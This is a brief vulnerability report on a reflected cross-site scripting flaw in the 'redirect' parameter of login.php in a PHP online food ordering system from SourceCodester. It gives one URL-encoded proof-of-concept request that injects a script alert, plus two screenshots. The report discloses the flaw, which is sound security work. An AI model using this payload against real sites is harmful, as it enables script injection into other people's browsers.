vendor：https://www.sourcecodester.com/

download link：https://www.sourcecodester.com/php/16022/online-food-ordering-system-v2-using-php8-and-mysql-free-source-code.html

Vulnerability trigger parameter: $redirect

The process of vulnerability discovery is as follows：
![image](https://user-images.githubusercontent.com/30823782/212480817-f964e25c-53b8-41c5-b925-459b0f4d4a69.png)
http://192.168.249.88/php-fos-db/login.php?redirect=%3C/script%3E%3Cscript%3Ealert(%27xss%27)%3C/script%3E
![image](https://user-images.githubusercontent.com/30823782/212480832-a32ef186-c320-4835-a3f8-24074eb4adca.png)

